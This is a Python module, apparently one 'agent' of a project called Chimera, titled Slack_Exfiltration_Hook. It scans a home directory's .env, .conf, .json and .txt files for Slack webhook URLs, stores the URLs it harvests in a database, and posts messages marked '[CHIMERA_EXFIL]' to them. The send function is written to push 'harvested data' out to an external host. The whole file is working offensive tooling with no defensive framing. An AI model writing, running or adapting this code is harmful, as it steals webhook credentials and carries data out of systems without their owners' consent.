import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import requests
import json
import logging

# The "GPS" line for project navigation
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Slack_Exfiltration_Hook:
    def __init__(self):
        self.agent_id = "59"
        self.name = "Slack_Exfiltration_Hook"
        self.db = ChimeraDB()
        
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(self.name)

    def find_tokens(self, search_path="/home/dan/"):
        """Scans for potential Slack tokens or Webhook URLs in config files."""
        self.logger.info(f"Scanning {search_path} for Slack credentials...")
        found_hooks = []
        
        # We look for the standard Slack Webhook prefix
        webhook_prefix = "https://hooks.slack.com/services/"
        
        for root, dirs, files in os.walk(search_path):
            for file in files:
                if file.endswith((".env", ".conf", ".json", ".txt")):
                    try:
                        with open(os.path.join(root, file), 'r') as f:
                            content = f.read()
                            if webhook_prefix in content:
                                # Simple logic to extract the URL
                                start = content.find(webhook_prefix)
                                end = content.find('"', start) if '"' in content[start:] else content.find('\n', start)
                                hook_url = content[start:end].strip()
                                found_hooks.append(hook_url)
                    except Exception:
                        continue
        return found_hooks

    def send_data(self, webhook_url, data_message):
        """Sends harvested data to the discovered Slack channel."""
        payload = {"text": f"[CHIMERA_EXFIL]: {data_message}"}
        try:
            response = requests.post(
                webhook_url, 
                data=json.dumps(payload),
                headers={'Content-Type': 'application/json'}
            )
            if response.status_code == 200:
                self.logger.warning(f"[+++] DATA EXFILTRATED TO SLACK: {webhook_url}")
                return True
        except Exception as e:
            self.logger.error(f"Exfiltration failed: {e}")
        return False

    def run(self):
        self.db.heartbeat(self.name)
        # 1. Search for hooks
        hooks = self.find_tokens()
        for hook in hooks:
            # 2. Log them in the Brain
            self.db.report_finding(self.name, "Slack_Webhook_Found", {"url": hook})
            # 3. Test exfiltration with a heartbeat message
            self.send_data(hook, "Agent 59 reporting for duty.")
        self.db.close()

if __name__ == "__main__":
    agent = Slack_Exfiltration_Hook()
    agent.run()
